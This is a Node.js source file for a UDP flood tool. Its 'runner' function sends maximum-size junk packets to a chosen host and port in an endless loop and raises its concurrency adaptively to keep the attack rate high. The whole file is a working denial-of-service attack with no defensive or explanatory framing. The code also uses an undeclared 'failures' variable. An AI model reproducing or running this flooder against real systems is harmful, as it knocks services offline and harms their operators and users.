const { sleep } = require('./sleep')
const { REQ_DELAY, INTERVAL, MAX_CONCURRENT_REQUESTS } = require('./constants')
const dgram = require('dgram')
const client = dgram.createSocket('udp4')

// max size is 9216 otherwise EMSGSIZE error
const messageBuf = Buffer.from('X'.repeat(9216))

const runner = async (host, port, CONCURRENT_REQUESTS, name) => {
  console.log(`Starting process for ${host}:${port} "${name}" with ${CONCURRENT_REQUESTS} max concurrent requests...`)

  let pending = 0
  let lastMinuteOk = 0
  let lastMinuteErr = 0

  let failureAttempts = 0

  let errRate = 0
  let requests_made = 0
  let rps = 0

  setInterval(() => {
    if (failureAttempts === 0) {
      console.log(name, '|', 'Req', requests_made, '|', 'Errors last min,%', errRate, '|', 'rps', rps, '|', 'R', CONCURRENT_REQUESTS)
    }
  }, INTERVAL)

  const adaptivenessInterval = 14
  setInterval(() => {
    if (failureAttempts === 0) {
      rps = Math.floor((lastMinuteOk + lastMinuteErr) / adaptivenessInterval)
      if (errRate > 90) {
        CONCURRENT_REQUESTS = Math.floor(CONCURRENT_REQUESTS * 0.4)
      } else if (errRate > 75) {
        CONCURRENT_REQUESTS = Math.floor(CONCURRENT_REQUESTS * 0.6)
      } else if (errRate > 60) {
        CONCURRENT_REQUESTS = Math.floor(CONCURRENT_REQUESTS * 0.8)
      } else if (errRate < 1) {
        CONCURRENT_REQUESTS = Math.floor(CONCURRENT_REQUESTS * 1.25)
      } else if (errRate < 5) {
        CONCURRENT_REQUESTS = Math.floor(CONCURRENT_REQUESTS * 1.15)
      } else if (errRate < 10) {
        CONCURRENT_REQUESTS = Math.floor(CONCURRENT_REQUESTS * 1.05)
      }
      if (CONCURRENT_REQUESTS > MAX_CONCURRENT_REQUESTS) {
        CONCURRENT_REQUESTS = MAX_CONCURRENT_REQUESTS
      } else if (CONCURRENT_REQUESTS < 1) {
        CONCURRENT_REQUESTS = 1
      }

      lastMinuteOk = 0
      lastMinuteErr = 0
    }
  }, adaptivenessInterval * 1000)

  while (true) {
    if (pending < CONCURRENT_REQUESTS) {
      pending++
      client.send(messageBuf, 0, messageBuf.length, port, host, (err) => {
        if (err) {
          lastMinuteErr++
          failures++
        } else {
          failures = 0
          failureAttempts = 0
          lastMinuteOk++
        }
        pending--
        requests_made++
        if (lastMinuteErr > 0 || lastMinuteOk > 0) {
          errRate = Math.floor(100 * (lastMinuteErr / (lastMinuteErr + lastMinuteOk)))
        }
      })
    } else {
      await sleep(REQ_DELAY)
    }
  }
}

module.exports = { runner }
